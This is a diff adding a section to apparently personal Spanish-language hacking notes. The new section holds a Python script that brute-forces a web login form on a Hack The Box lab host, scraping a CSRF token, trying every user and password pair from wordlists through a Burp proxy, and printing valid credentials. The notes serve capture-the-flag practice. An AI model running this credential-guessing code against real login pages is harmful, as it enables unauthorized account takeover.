@@ -323,6 +323,66 @@ ln: Es el comando para crear enlaces.
 
 ```
 
+
+
+## Brute Force Alternativa a cosas como Hydra
+
+Esto es una alternativa a hydra para hacer brute force lo que si falta es ponerle hilos para que vaya mas rapido
+
+```
+#!/usr/bin/python3
+
+import requests, pdb, sys, time, re, signal
+import urllib3, threading
+
+
+def def_handler(sig, frame):
+        print("\n\n[!] Saliendo...\n")
+        sys.exit(1)
+
+
+signal.signal(signal.SIGINT, def_handler)
+
+
+url = 'http://monitor.bart.htb/index.php'
+burp = { 'http': 'http://127.0.0.1:8080'}
+
+
+
+def main():
+	#time.sleep(10)
+	s=requests.session()
+	r = s.get(url)
+	#print(r.text)
+	csrfToken = re.findall(r'name="csrf" value="(.*?)"',r.text)[0]
+	#pdb.set_trace()# l y p para ver valores.
+
+
+	with open("user.txt", "rb") as users_file:
+		usuarios = [linea.decode().strip() for linea in users_file]
+	with open("passwords.txt", "rb") as passwords_file:
+		contraseñas = [linea.decode().strip() for linea in passwords_file]
+		for usuario in usuarios:
+			for contraseña in contraseñas:
+				#print(f"Probando: Usuario={usuario}, Contraseña={contraseña}")
+				post_data = {'csrf': csrfToken,'user_name': usuario,'user_password': contraseña,'action':'Login'}
+				r = s.post(url,data=post_data,proxies=burp)
+				if "The information is incorrect"  not in r.text:
+					print(f"Se encontro una contraseña correcta {usuario}:{contraseña}")
+		
+		
+
+
+
+if __name__ == '__main__':
+	main()
+
+```
+
+
+
+
+
 ## Ascii
 
 ```
